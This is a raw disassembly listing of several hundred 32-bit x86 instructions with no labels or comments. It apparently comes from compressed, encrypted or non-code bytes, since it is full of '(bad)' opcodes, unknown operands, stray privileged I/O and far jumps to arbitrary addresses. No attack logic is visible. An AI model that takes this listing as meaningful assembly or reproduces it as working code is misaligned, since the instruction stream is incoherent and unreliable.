  41c24b:	add    BYTE PTR [ecx],bh
  41c24d:	(bad)  
  41c24f:	mov    al,0x10
  41c251:	lea    edi,[ebx-0x2786d252]
  41c257:	adc    al,0xb
  41c259:	retf   
  41c25a:	pop    edi
  41c25b:	xchg   edi,eax
  41c25c:	sbb    DWORD PTR [ebx+eiz*4-0x65],0x23b17f5c
  41c264:	aad    0x4d
  41c266:	(bad)  
  41c267:	addr16 dec esp
  41c269:	and    al,0x8c
  41c26b:	je     0x41c240
  41c26d:	push   cs
  41c26e:	(bad)  
  41c26f:	stc    
  41c270:	fdiv   QWORD PTR fs:[edi+0x9]
  41c274:	call   0xd717:0x6142b46c
  41c27b:	mov    bl,BYTE PTR [eax]
  41c27d:	xchg   edx,eax
  41c27e:	loope  0x41c2df
  41c280:	pusha  
  41c281:	sub    al,bh
  41c283:	mov    ebp,0x57a0510e
  41c288:	pop    eax
  41c289:	xor    ebx,edi
  41c28b:	outs   dx,BYTE PTR ds:[esi]
  41c28c:	les    edi,FWORD PTR [edi-0x6cf9376e]
  41c292:	cmp    BYTE PTR [edi],dl
  41c294:	xor    edi,DWORD PTR [edx-0x2a]
  41c297:	pop    esi
  41c298:	xor    eax,0x205c3f12
  41c29d:	test   eax,0xd3fd3981
  41c2a2:	scas   eax,DWORD PTR es:[edi]
  41c2a3:	push   cs
  41c2a4:	mov    bl,0x14
  41c2a6:	fs aad 0xaf
  41c2a9:	loope  0x41c318
  41c2ab:	loop   0x41c2ab
  41c2ad:	jge    0x41c316
  41c2af:	and    DWORD PTR [ecx+0x58a2bff3],ecx
  41c2b5:	push   ss
  41c2b6:	xchg   ebp,eax
  41c2b7:	retf   
  41c2b8:	xor    BYTE PTR [eax+0x36],dh
  41c2bb:	xor    ecx,eax
  41c2bd:	xchg   BYTE PTR [edi+ecx*1],bl
  41c2c0:	adc    al,0x51
  41c2c2:	cld    
  41c2c3:	pop    edi
  41c2c4:	ror    DWORD PTR [edx],0x81
  41c2c7:	inc    esi
  41c2c8:	mov    ds:0xd49f216f,al
  41c2cd:	mov    al,0xaa
  41c2cf:	mov    dh,0x39
  41c2d1:	mov    al,ds:0xedea7e92
  41c2d6:	push   esi
  41c2d7:	daa    
  41c2d8:	mov    esp,0x9990d1aa
  41c2dd:	pop    eax
  41c2de:	stc    
  41c2df:	sbb    eax,0x55ee7737
  41c2e4:	popa   
  41c2e5:	mov    edx,0x535b0da3
  41c2ea:	xchg   ebp,eax
  41c2eb:	and    al,0xa7
  41c2ed:	or     dh,BYTE PTR [ebx]
  41c2ef:	mov    al,0x31
  41c2f1:	ret    
  41c2f2:	clc    
  41c2f3:	outs   dx,DWORD PTR ds:[esi]
  41c2f4:	adc    BYTE PTR [eax+0x4ff7110d],cl
  41c2fa:	add    al,0x4
  41c2fc:	jmp    0x1a84:0x58253d92
  41c303:	ror    BYTE PTR [edx-0x7],cl
  41c306:	pop    ebp
  41c307:	mov    bh,dl
  41c309:	push   es
  41c30a:	and    al,BYTE PTR [eax+0x20b977c9]
  41c310:	mov    ebx,es
  41c312:	sub    bh,BYTE PTR [eax+0x72]
  41c315:	mov    esp,0x6eb59eae
  41c31a:	je     0x41c39b
  41c31c:	xchg   edx,eax
  41c31d:	or     BYTE PTR cs:[eax],0x42
  41c321:	leave  
  41c322:	cmp    DWORD PTR [ebp+ebx*2+0x70f0f74a],edx
  41c329:	neg    BYTE PTR [eax]
  41c32b:	pop    ebx
  41c32c:	adc    eax,0xca33b6e9
  41c331:	sub    eax,0xf58a3334
  41c336:	adc    al,0xca
  41c338:	jl     0x41c2ed
  41c33a:	dec    edx
  41c33b:	aas    
  41c33c:	adc    eax,eax
  41c33e:	xlat   BYTE PTR ds:[ebx]
  41c33f:	jns    0x41c362
  41c341:	sbb    edi,esp
  41c343:	jmp    0x9d42f291
  41c348:	les    edx,FWORD PTR [esi]
  41c34a:	mov    bl,0x4c
  41c34c:	jge    0x41c364
  41c34e:	(bad)  
  41c34f:	in     al,dx
  41c350:	shl    BYTE PTR [esi+0x156c57a4],cl
  41c356:	ins    DWORD PTR es:[edi],dx
  41c357:	xor    DWORD PTR [edi],edi
  41c359:	aam    0xc4
  41c35b:	std    
  41c35c:	in     al,dx
  41c35d:	sub    DWORD PTR [edx+0x102824c0],edi
  41c363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c364:	cmp    eax,0x54317147
  41c369:	pop    eax
  41c36a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41c36c:	mov    dl,0xe5
  41c36e:	jg     0x41c354
  41c370:	test   al,0x7d
  41c372:	mov    esp,0x1df3ab37
  41c377:	push   0x3a
  41c379:	mov    esi,0x7c68fe02
  41c37e:	std    
  41c37f:	loop   0x41c352
  41c381:	dec    eax
  41c382:	loop   0x41c335
  41c384:	add    eax,0xfac3193
  41c389:	xor    ebp,DWORD PTR [edi-0x78]
  41c38c:	cli    
  41c38d:	pop    edx
  41c38e:	shl    ecx,1
  41c390:	mov    edi,eax
  41c392:	adc    esp,DWORD PTR [ebp+ecx*8+0x4]
  41c396:	leave  
  41c397:	jmp    0x3de27fdf
  41c39c:	jnp    0x41c368
  41c39e:	jne    0x41c3e1
  41c3a0:	jle    0x41c34c
  41c3a2:	jno    0x41c35d
  41c3a4:	push   ds
  41c3a5:	rcr    BYTE PTR [ebx+0x6d],0xa
  41c3a9:	jne    0x41c389
  41c3ab:	sbb    ebx,DWORD PTR [ebx]
  41c3ad:	out    dx,al
  41c3ae:	xchg   BYTE PTR [edx+0x1453b900],cl
  41c3b4:	mov    ebx,0x762e5ccc
  41c3b9:	in     al,dx
  41c3ba:	(bad)  
  41c3bb:	inc    edi
  41c3bc:	clc    
  41c3bd:	and    eax,0x3b5d1d3b
  41c3c2:	pop    eax
  41c3c3:	out    dx,eax
  41c3c4:	in     al,0x84
  41c3c6:	push   edx
  41c3c7:	sub    bl,BYTE PTR ds:0xd371d216
  41c3cd:	or     DWORD PTR [ecx-0x3b],ecx
  41c3d0:	rol    ch,1
  41c3d2:	in     al,dx
  41c3d3:	xchg   DWORD PTR [esi-0xb],edi
  41c3d6:	imul   edx,DWORD PTR [edx],0x877b07b3
  41c3dc:	out    0xcf,al
  41c3de:	push   ebx
  41c3df:	push   ebx
  41c3e0:	mov    edi,0x9667e99d
  41c3e5:	arpl   si,bp
  41c3e7:	cmp    DWORD PTR [ebp+0x71e5e7c2],ecx
  41c3ed:	dec    ecx
  41c3ee:	enter  0xc9b2,0xcc
  41c3f2:	nop
  41c3f3:	pop    esi
  41c3f4:	mul    BYTE PTR [eax+0x52]
  41c3f7:	imul   ebp,DWORD PTR ds:0xb771e4f7,0xdfad8e8
  41c401:	in     eax,dx
  41c402:	mov    ah,0x88
  41c404:	sub    al,0x8b
  41c406:	lahf   
  41c407:	xor    dh,BYTE PTR [edi-0x4]
  41c40a:	xchg   esp,eax
  41c40b:	aaa    
  41c40c:	xchg   ebp,eax
  41c40d:	add    esi,DWORD PTR [ebx]
  41c40f:	test   al,0xdb
  41c411:	and    al,0xe3
  41c413:	jecxz  0x41c463
  41c415:	and    DWORD PTR [esi-0x4ec7fdca],edi
  41c41b:	xchg   esi,eax
  41c41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c41d:	test   DWORD PTR [eax*4-0x50e307bb],ebp
  41c424:	sahf   
  41c425:	aam    0x2c
  41c427:	adc    al,0x1c
  41c429:	into   
  41c42a:	and    BYTE PTR [esi],0x9c
  41c42d:	aam    0x1d
  41c42f:	sar    DWORD PTR [ebx-0xe],0xce
  41c433:	mov    cl,BYTE PTR [edx]
  41c435:	xor    eax,0x2e3d157f
  41c43a:	or     esp,DWORD PTR [ecx+0x5d0f648d]
  41c440:	sub    BYTE PTR [ebx-0x543c4579],dh
  41c446:	sub    al,0x58
  41c448:	dec    eax
  41c449:	sti    
  41c44a:	push   ebp
  41c44b:	rol    BYTE PTR [ebp+0x4df473c1],1
  41c451:	pop    ecx
  41c452:	push   esi
  41c453:	ins    BYTE PTR es:[edi],dx
  41c454:	push   0xbd26e315
  41c459:	(bad)  
  41c45a:	push   0x92cb1f72
  41c45f:	lods   eax,DWORD PTR ds:[esi]
  41c460:	mov    es,WORD PTR [edx+edx*2]
  41c463:	neg    BYTE PTR [edx+0x2d0a6344]
  41c469:	dec    esp
  41c46a:	push   0x65f6d23e
  41c46f:	inc    esi
  41c470:	pop    ds
  41c471:	xchg   esp,eax
  41c472:	and    eax,0xf62ba05b
  41c477:	push   0xb
  41c479:	mov    ds:0xfdecd3d3,eax
  41c47e:	push   cs
  41c47f:	dec    esp
  41c480:	outs   dx,DWORD PTR ds:[esi]
  41c481:	mov    ?,esi
  41c483:	call   0x59aecd7c
  41c488:	or     eax,0x27eb4681
  41c48d:	xchg   edi,eax
  41c48e:	rcr    DWORD PTR [ecx+0x36acf94],1
  41c494:	pusha  
  41c495:	(bad)  
  41c496:	or     DWORD PTR [edi-0x54],ebx
  41c499:	(bad)  
  41c49a:	dec    ebp
  41c49b:	or     esp,DWORD PTR [eax-0x1249bafe]
  41c4a1:	push   cs
  41c4a2:	(bad)  
  41c4a3:	pop    eax
  41c4a4:	jecxz  0x41c455
  41c4a6:	test   BYTE PTR [ebx],0xc9
  41c4a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4aa:	(bad)  
  41c4ab:	mov    ss,WORD PTR [ecx+0x2b]
  41c4ae:	lods   al,BYTE PTR ds:[esi]
  41c4af:	out    0x7a,eax
  41c4b1:	outs   dx,BYTE PTR ds:[esi]
  41c4b2:	data16 into 
  41c4b4:	(bad)  
  41c4b6:	rcr    DWORD PTR [edi+0x6b],0x7c
  41c4ba:	add    cl,cl
  41c4bc:	xor    DWORD PTR [edi],edx
  41c4be:	cwde   
  41c4bf:	mov    bh,0x9e
  41c4c1:	cdq    
  41c4c2:	or     bl,BYTE PTR [eax]
  41c4c4:	pop    ds
  41c4c5:	sub    esi,0xffffffbf
  41c4c8:	daa    
  41c4c9:	ficom  DWORD PTR [esi+0x16]
  41c4cc:	not    DWORD PTR [esi-0x4fed4e44]
  41c4d2:	xlat   BYTE PTR ds:[ebx]
  41c4d3:	lods   al,BYTE PTR ds:[esi]
  41c4d4:	cmc    
  41c4d5:	dec    ebx
  41c4d6:	mov    ecx,0x59528772
  41c4db:	imul   BYTE PTR [edi-0x3814113c]
  41c4e1:	pop    edi
  41c4e2:	out    0x28,al
  41c4e4:	mov    dh,0xc
  41c4e6:	mov    ch,BYTE PTR [ebp+0xfd37b36]
  41c4ec:	adc    BYTE PTR [edx-0x7b1b9ed0],ah
  41c4f2:	jmp    0x9b6de461
  41c4f7:	into   
  41c4f8:	mov    dh,0x65
  41c4fa:	stos   DWORD PTR es:[edi],eax
  41c4fb:	mov    ah,0x54
  41c4fd:	lods   eax,DWORD PTR ds:[esi]
  41c4fe:	sti    
  41c4ff:	popf   
  41c500:	mov    ch,0xaa
  41c502:	jns    0x41c4d7
  41c504:	(bad)  
  41c505:	pop    ebx
  41c506:	lahf   
  41c507:	push   ss
  41c508:	in     eax,0x3e
  41c50a:	cmp    eax,0xac7be32f
  41c50f:	adc    al,0x33
  41c511:	js     0x41c52a
  41c513:	ins    BYTE PTR es:[edi],dx
  41c514:	hlt    
  41c515:	cs jb  0x41c51c
  41c518:	or     eax,0x6ad13e69
  41c51d:	repz shl DWORD PTR [edx-0x41],0xa3
  41c522:	mov    eax,ds:0x121b7709
  41c527:	cwde   
  41c528:	lahf   
  41c529:	jmp    0xf6ae1a16
  41c52e:	jle    0x41c571
  41c530:	and    al,0x40
  41c532:	and    ch,bh
  41c534:	loope  0x41c4d5
  41c536:	inc    esp
  41c537:	sub    al,0x8e
  41c539:	scas   eax,DWORD PTR es:[edi]
  41c53a:	xchg   cl,ah
  41c53c:	test   DWORD PTR [edx+0x3e],0x3f460351
  41c543:	repnz inc edx
  41c545:	imul   BYTE PTR [esi]
  41c547:	inc    ebx
  41c548:	scas   al,BYTE PTR es:[edi]
  41c549:	jg     0x41c554
  41c54b:	aaa    
  41c54c:	push   edx
  41c54d:	test   BYTE PTR [ebp-0x6b],ah
  41c550:	mov    esp,0xee67c891
  41c555:	scas   eax,DWORD PTR es:[edi]
  41c556:	ror    DWORD PTR [ecx],cl
  41c558:	xchg   BYTE PTR [esi+ebx*2-0x29],dh
  41c55c:	mov    al,ds:0x823f7ecd
  41c561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c562:	fild   DWORD PTR [edi-0x8]
  41c565:	and    BYTE PTR [ebp+0x64],dl
  41c568:	inc    edx
  41c569:	xor    al,dh
  41c56b:	int    0x6b
  41c56d:	mov    cl,0x5
  41c56f:	je     0x41c599
  41c571:	add    ch,BYTE PTR [eax]
  41c573:	mov    al,ds:0x22801f09
  41c578:	int    0xd3
  41c57a:	push   ds
  41c57b:	(bad)  
  41c57c:	std    
  41c57d:	add    al,0x90
  41c57f:	rcr    BYTE PTR [edi-0x71],0xff
  41c583:	pushf  
  41c584:	sbb    bh,BYTE PTR [ebx-0x48]
  41c587:	mov    ecx,0x8b0856f0
  41c58c:	ret    
  41c58d:	sti    
  41c58e:	inc    ebp
  41c58f:	ret    
  41c590:	rol    BYTE PTR [ebx+0x32f755c1],1
  41c596:	repnz mov WORD PTR [ebx+ecx*2+0x6f399146],gs
  41c59e:	(bad)  
  41c59f:	fcom   DWORD PTR [ecx-0x6a303af8]
  41c5a5:	mov    WORD PTR [edx],fs
  41c5a7:	mov    bl,0x7
  41c5a9:	lea    ecx,[eiz*2-0x58dafe41]
  41c5b0:	or     eax,0x66b131e3
  41c5b5:	js     0x41c563
  41c5b7:	clc    
  41c5b8:	daa    
  41c5b9:	loop   0x41c5a5
  41c5bb:	pop    es
  41c5bc:	sbb    al,BYTE PTR [ebx-0x18096ee]
  41c5c2:	sub    edi,edx
  41c5c4:	pop    esp
  41c5c5:	pop    es
  41c5c6:	ror    al,0xbb
  41c5c9:	and    DWORD PTR [ebp+0x15],esp
  41c5cc:	out    0xf1,eax
  41c5ce:	test   eax,0x8dc5aa78
  41c5d3:	nop
  41c5d4:	push   0x43
  41c5d6:	xor    ebx,ebx
  41c5d8:	lods   eax,DWORD PTR ds:[esi]
  41c5d9:	xlat   BYTE PTR ds:[ebx]
  41c5da:	sub    ah,ah
  41c5dc:	mov    eax,DWORD PTR [esi-0x77c23fbd]
  41c5e2:	dec    eax
  41c5e3:	into   
  41c5e4:	mov    dh,0x72
  41c5e6:	mov    ebx,0x6d00aac1
  41c5eb:	jecxz  0x41c5be
  41c5ed:	mov    esi,0x11923c4
  41c5f2:	add    eax,0x9726de63
  41c5f7:	std    
  41c5f8:	push   esp
  41c5f9:	jp     0x41c61a
  41c5fb:	nop
  41c5fc:	dec    ebp
  41c5fd:	xchg   BYTE PTR [edi],al
  41c5ff:	push   eax
  41c600:	js     0x41c615
  41c602:	sbb    eax,0x433a7515
  41c607:	loope  0x41c5c3
  41c609:	es mov ch,0x5b
  41c60c:	mov    edi,0x98fb52a5
  41c611:	and    eax,0x5dfce6ac
  41c616:	add    edx,esi
  41c618:	sub    dh,BYTE PTR ds:0x856def23
  41c61e:	dec    edi
  41c61f:	sub    BYTE PTR [edx-0x5da28b22],cl
  41c625:	sub    ebp,edx
  41c627:	jp     0x41c657
  41c629:	mov    WORD PTR [bx+di+0x4fcc],?
  41c62e:	xchg   edi,eax
  41c62f:	cdq    
  41c630:	outs   dx,DWORD PTR ds:[esi]
  41c631:	rcl    BYTE PTR [ebp+0x1e19160],1
  41c637:	or     ebx,DWORD PTR [ebp+eiz*4-0x5ae05fe]
  41c63e:	popa   
  41c63f:	pop    ss
  41c640:	fild   QWORD PTR [edi+ebp*4+0x7a716842]
  41c647:	test   dl,cl
  41c649:	jb     0x41c692
  41c64b:	enter  0x524f,0x48
  41c64f:	popa   
  41c650:	sub    dh,BYTE PTR [edi-0x49]
  41c653:	in     al,0x3
  41c655:	sub    eax,0x5f18639f
  41c65a:	fnclex 
  41c65c:	test   BYTE PTR [esi],ch
  41c65e:	pop    eax
  41c65f:	pushf  
  41c660:	sbb    DWORD PTR [ebp-0x7e],0x3d35898e
  41c667:	pop    es
  41c668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c669:	jmp    0x819b:0xcf2f2566
  41c670:	lds    ebp,FWORD PTR [ebp+0x1c]
  41c673:	cdq    
  41c674:	add    al,0xa7
  41c676:	(bad)  
  41c677:	stos   BYTE PTR es:[edi],al
  41c678:	iret   
  41c679:	enter  0xd7df,0x1d
  41c67d:	mov    esp,0xb08663b6
  41c682:	mov    ecx,0x787d16d9
  41c687:	cmp    eax,0x6fd97b0c
  41c68c:	push   ss
  41c68d:	pop    es
  41c68e:	mov    edi,0x531f16a9
  41c693:	bound  ecx,QWORD PTR [ecx+0x5f068fd7]
  41c699:	xlat   BYTE PTR ds:[ebx]
  41c69a:	xchg   esi,eax
  41c69b:	mov    WORD PTR [eax],es
  41c69d:	xchg   ebx,eax
  41c69e:	popf   
  41c69f:	mov    edi,0xa5f76094
  41c6a4:	inc    eax
  41c6a5:	mov    eax,0x6db0707e
  41c6aa:	iret   
  41c6ab:	xor    BYTE PTR [ecx*2+0x5f82075c],bh
  41c6b2:	or     edx,edi
  41c6b4:	shl    BYTE PTR [edx],cl
  41c6b6:	pop    ebp
  41c6b7:	setb   BYTE PTR [ebx]
  41c6ba:	and    DWORD PTR [edi],ecx
  41c6bc:	pop    ss
  41c6bd:	sub    dl,BYTE PTR [ecx+0x1ed04f5a]
  41c6c3:	add    al,0xe7
  41c6c5:	test   ch,dh
  41c6c7:	jb     0x41c696
  41c6c9:	mov    cl,0xb0
  41c6cb:	fldcw  WORD PTR [eax+0x73]
  41c6ce:	adc    dh,BYTE PTR [edi*4+0x4179ca3a]
  41c6d5:	jp     0x41c703
  41c6d7:	and    dl,BYTE PTR [esi]
  41c6d9:	hlt    
  41c6da:	fld    st(6)
  41c6dc:	pop    edi
  41c6dd:	retf   0x2de6
  41c6e0:	ins    DWORD PTR es:[edi],dx
  41c6e1:	ret    0x41b8
  41c6e4:	pop    esp
  41c6e5:	xchg   ecx,eax
  41c6e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e7:	loopne 0x41c75b
  41c6e9:	jo     0x41c680
  41c6eb:	mov    ebx,0x31dfd13
  41c6f0:	aad    0xcf
  41c6f2:	fst    DWORD PTR [ebx]
  41c6f4:	cs push esp
  41c6f6:	jne    0x41c681
  41c6f8:	sbb    DWORD PTR [esi-0x64a7fe77],0xf4d8fc0e
  41c702:	dec    ebx
  41c703:	push   esi
  41c704:	add    DWORD PTR [eax-0x183b080c],ebp
  41c70a:	pop    edi
  41c70b:	cmp    ch,BYTE PTR [ecx]
  41c70d:	and    al,0x65
  41c70f:	pop    eax
  41c710:	arpl   WORD PTR [ecx-0x54],dx
  41c713:	shr    BYTE PTR [eax+0x532020eb],1
  41c719:	jo     0x41c74f
  41c71b:	xchg   edi,edi
  41c71d:	mov    ah,0x2
  41c71f:	sahf   
  41c720:	inc    esi
  41c721:	aas    
  41c722:	mov    al,0x74
  41c724:	add    al,0xd1
  41c726:	push   esp
  41c727:	sbb    al,al
  41c729:	outs   dx,DWORD PTR ds:[esi]
  41c72a:	data16 mov BYTE PTR [eax+0xdf9c95d],bl
  41c731:	fcomip st,st(2)
  41c733:	mov    fs,WORD PTR [ebx]
  41c735:	ja     0x41c705
  41c737:	nop
  41c738:	or     bh,cl
  41c73a:	jbe    0x41c7a8
  41c73c:	call   0x9f4d61c9
  41c741:	stos   DWORD PTR es:[edi],eax
  41c742:	xor    dl,bh
  41c744:	cwde   
  41c745:	or     dl,BYTE PTR [edx+0x5b]
  41c748:	pop    ss
  41c749:	in     eax,0xab
  41c74b:	clc    
  41c74c:	outs   dx,DWORD PTR ds:[esi]
  41c74d:	je     0x41c6ea
  41c74f:	xchg   esp,eax
  41c750:	out    dx,eax
  41c751:	xchg   esi,eax
  41c752:	xchg   edx,eax
  41c753:	pushf  
  41c754:	jg     0x41c794
  41c756:	fmulp  st(4),st
  41c758:	fidiv  DWORD PTR [ebx+0x3b772ef7]
  41c75e:	cmc    
  41c75f:	add    cl,ch
  41c761:	or     DWORD PTR [ebx-0x3a],edx
  41c764:	ins    DWORD PTR es:[edi],dx
  41c765:	jns    0x41c756
  41c767:	mov    ebx,0x5bb571e1
  41c76c:	(bad)  
  41c76d:	and    eax,0xebe04108
  41c772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c773:	push   ds
  41c774:	imul   esi,DWORD PTR [esi],0x9770424e
  41c77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c77b:	mov    al,ds:0xd6a1f5df
  41c780:	or     al,0xd0
  41c782:	dec    edi
  41c783:	xor    ebx,DWORD PTR [eax+esi*8-0xffbeac4]
  41c78a:	pop    eax
  41c78b:	fst    QWORD PTR [ecx-0x141ef3ae]
  41c791:	mov    bl,0x32
  41c793:	mov    esp,0x14edd274
  41c798:	mov    eax,0xbdd552c3
  41c79d:	idiv   DWORD PTR [edi]
  41c79f:	lea    edx,[ebp+eax*4-0x4ef5fc9c]
  41c7a6:	test   BYTE PTR [eax+0x38],bl
  41c7a9:	clc    
  41c7aa:	sbb    al,0x78
  41c7ac:	mov    eax,ds:0xd0ae4c0b
  41c7b1:	push   cs
  41c7b2:	out    dx,al
  41c7b3:	or     eax,0x69d99fe4
  41c7b8:	xor    ch,dh
  41c7ba:	sbb    ebx,DWORD PTR [eax-0x229690a0]
  41c7c0:	stos   BYTE PTR es:[edi],al
  41c7c1:	xchg   esi,eax
  41c7c2:	push   ebp
  41c7c3:	loop   0x41c844
  41c7c5:	ss add eax,0x9e85ad47
  41c7cb:	(bad)  
  41c7cc:	je     0x41c7c7
  41c7ce:	sahf   
  41c7cf:	lock lock adc ecx,DWORD PTR [ecx-0x71]
  41c7d4:	shl    DWORD PTR [ebp+0x5b08b349],0xc6
  41c7db:	add    dl,al
  41c7dd:	xor    eax,0x4e378e86
  41c7e2:	mov    eax,0xf75b4b2e
  41c7e7:	fmul   QWORD PTR [edi-0x2a]
  41c7ea:	dec    ebp
  41c7eb:	inc    edi
  41c7ec:	lds    eax,FWORD PTR [edx+0x2c]
  41c7ef:	cmc    
  41c7f0:	fidiv  DWORD PTR [eax+0x1d47df59]
  41c7f6:	inc    edx
  41c7f7:	push   0x970dd2c4
  41c7fc:	push   ecx
  41c7fd:	inc    ebx
  41c7fe:	inc    esi
  41c7ff:	(bad)  
  41c800:	dec    eax
  41c801:	jae    0x41c83d
  41c803:	mov    BYTE PTR [edi-0x841f789],cl
  41c809:	repz pop ss
  41c80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c80c:	leave  
  41c80d:	jp     0x41c85b
  41c80f:	mov    ebx,0xecf62d27
  41c814:	cmp    eax,0x9c500624
  41c819:	hlt    
  41c81a:	or     ch,bl
  41c81c:	inc    eax
  41c81d:	xchg   edx,eax
  41c81e:	mov    al,ds:0xeca257f1
  41c823:	mov    al,ds:0xacf29cee
  41c828:	adc    DWORD PTR [esi],esp
  41c82a:	in     eax,0x46
  41c82c:	imul   DWORD PTR [ebx+0xded894e]
  41c832:	mov    edx,0x8dcf2f86
  41c837:	(bad)  
  41c838:	out    0xf1,al
  41c83a:	add    eax,0x4ea6509a
  41c83f:	popf   
  41c840:	or     DWORD PTR [eax+0x1e],ecx
  41c843:	into   
  41c844:	popa   
  41c845:	pusha  
  41c846:	gs add al,0x5e
  41c849:	sbb    al,0xe5
  41c84b:	ins    BYTE PTR es:[edi],dx
  41c84c:	int3   
  41c84d:	mov    al,0x1c
  41c84f:	sub    dl,BYTE PTR [esi-0x71]
  41c852:	push   0x1bb5c650
  41c857:	and    bl,BYTE PTR [edi-0x6]
  41c85a:	aas    
  41c85b:	or     eax,0x88defc87
  41c860:	cdq    
  41c861:	(bad)  
  41c863:	popf   
  41c864:	jno    0x41c823
  41c866:	mov    al,ds:0xd9f1776c
  41c86b:	xchg   ebx,eax
  41c86c:	stos   BYTE PTR es:[edi],al
  41c86d:	ja     0x41c86c
  41c86f:	(bad)  [ecx]
  41c871:	inc    edi
  41c872:	lods   al,BYTE PTR ds:[esi]
  41c873:	fidivr DWORD PTR [esi-0x7b]
  41c876:	mov    ds:0xc10f0a1,al
  41c87b:	addr16 mov ecx,0xc21976a7
  41c881:	jne    0x41c86a
  41c883:	(bad)  
  41c884:	xor    al,0xa6
  41c886:	test   BYTE PTR [edi],ch
  41c888:	fdivr  DWORD PTR [ebx+esi*8+0x68]
  41c88c:	dec    edx
  41c88d:	jp     0x41c830
  41c88f:	jnp    0x41c8f2
  41c891:	mul    ch
  41c893:	mov    WORD PTR [ecx-0x6b],fs
  41c896:	shl    DWORD PTR [esi-0x7df4a389],cl
  41c89c:	rcr    BYTE PTR [eax],0xe7
  41c89f:	mov    dl,0x52
  41c8a1:	icebp  
  41c8a2:	and    esi,DWORD PTR [eax]
  41c8a4:	cmp    eax,0x528c6734
  41c8a9:	js     0x41c8b9
  41c8ab:	rol    BYTE PTR [ecx],0x69
  41c8ae:	fidivr DWORD PTR [edx-0x489c0c95]
  41c8b4:	dec    edi
  41c8b5:	add    eax,0x4cbd7f46
  41c8ba:	jbe    0x41c921
  41c8bc:	loop   0x41c8da
  41c8be:	arpl   WORD PTR [edi-0x2e],si
  41c8c1:	outs   dx,BYTE PTR ds:[esi]
  41c8c2:	dec    ebx
  41c8c3:	int    0x1f
  41c8c5:	jl     0x41c93a
  41c8c7:	or     al,0x64
  41c8c9:	in     al,0xfa
  41c8cb:	mov    bl,0x60
  41c8cd:	repnz mov eax,edx
  41c8d0:	push   edx
  41c8d1:	rcl    DWORD PTR [edi+0x52],cl
  41c8d4:	(bad)  
  41c8d5:	dec    ebp
  41c8d6:	push   cs
  41c8d7:	push   0xe3e906a5
  41c8dc:	mov    es,WORD PTR [eax+ecx*8+0x34]
  41c8e0:	xor    DWORD PTR [eax+0x15],ecx
  41c8e3:	cdq    
  41c8e4:	or     DWORD PTR [ebp+0x1f],ebp
  41c8e7:	inc    edi
  41c8e8:	adc    BYTE PTR [edx+0x23],ch
  41c8eb:	push   0x2bc56624
  41c8f0:	xchg   ecx,eax
  41c8f1:	jne    0x41c92f
  41c8f3:	sbb    eax,0x828f494e
  41c8f8:	les    edi,FWORD PTR [ebx]
  41c8fa:	js     0x41c8cc
  41c8fc:	test   DWORD PTR [edi],edx
  41c8fe:	or     al,0x7
  41c900:	xor    al,0x4b
  41c902:	mov    ds,WORD PTR [eax]
  41c904:	sbb    eax,0xdba50707
  41c909:	jle    0x41c941
  41c90b:	lods   al,BYTE PTR ds:[esi]
  41c90c:	pop    edi
  41c90d:	inc    edx
  41c90e:	mov    BYTE PTR [esi],al
  41c910:	neg    DWORD PTR [esi]
  41c912:	and    al,0xc9
  41c914:	rol    DWORD PTR [esi],1
  41c916:	mov    ah,0x4c
  41c918:	aas    
  41c919:	or     al,0xf6
  41c91b:	call   FWORD PTR [edi-0x71]
  41c91e:	jbe    0x41c98e
  41c920:	sar    dh,1
  41c922:	test   BYTE PTR [ebx-0x40],bh
  41c925:	jle    0x41c8c0
  41c927:	or     dh,BYTE PTR [ebx+ecx*4+0x56]
  41c92b:	adc    edi,0x59
  41c92e:	push   ss
  41c92f:	pop    esp
  41c930:	ret    
  41c931:	retf   0x7674
  41c934:	mov    BYTE PTR [edi+0x4a873591],al
  41c93a:	xor    cl,BYTE PTR [ebx]
  41c93c:	mov    edx,0x49c5305b
  41c941:	jg     0x41c964
  41c943:	std    
  41c944:	push   esi
  41c945:	leave  
  41c946:	adc    eax,0x7b1ccc22
  41c94b:	ret    
  41c94c:	fwait
  41c94d:	fwait
  41c94e:	popf   
  41c94f:	push   edx
  41c950:	mov    eax,0x364a8250
  41c955:	pop    ebx
  41c956:	jle    0x41c975
  41c958:	frstor [eax+0x26232406]
  41c95e:	or     edx,ebx
  41c960:	mov    ?,WORD PTR [ecx-0x2b6fefbb]
  41c966:	inc    ebx
  41c967:	loopne 0x41c95a
  41c969:	inc    esp
  41c96a:	sub    DWORD PTR [ecx+0x4cd71c6c],ecx
  41c970:	mov    ?,WORD PTR [ebx]
  41c972:	nop
  41c973:	in     eax,dx
  41c974:	or     esi,DWORD PTR [ebx+0x38]
  41c977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c978:	add    dl,BYTE PTR es:[esi+0x5d]
  41c97c:	sahf   
  41c97d:	into   
  41c97e:	icebp  
  41c97f:	push   edx
  41c980:	les    ebx,FWORD PTR [edx+0x22]
  41c983:	adc    BYTE PTR [esi+0x33],ch
  41c986:	fwait
  41c987:	push   cs
  41c988:	push   0x4e74a401
  41c98d:	in     eax,dx
  41c98e:	mov    edi,0x9a27706a
  41c993:	push   cs
  41c994:	xor    ah,BYTE PTR [ecx-0x150caf5e]
  41c99a:	stos   BYTE PTR es:[edi],al
  41c99b:	dec    ebp
  41c99c:	cmp    BYTE PTR [ebp+0x638f5aa4],bh
  41c9a2:	pop    eax
  41c9a3:	dec    eax
  41c9a4:	mov    WORD PTR [ebp+0x6],?
  41c9a7:	jb     0x41c94d
  41c9a9:	and    esi,DWORD PTR [eax]
  41c9ab:	xor    BYTE PTR [esi],dl
  41c9ad:	clc    
  41c9ae:	xor    ecx,DWORD PTR [ebx]
  41c9b0:	es push ecx
  41c9b2:	xlat   BYTE PTR ds:[ebx]
  41c9b3:	pop    ss
  41c9b4:	aam    0xeb
  41c9b6:	add    edx,ebp
  41c9b8:	mov    ?,esi
  41c9ba:	pop    esi
  41c9bb:	xor    dh,cl
  41c9bd:	mov    cl,0xce
  41c9bf:	and    BYTE PTR cs:[edx-0x901be9a],ch
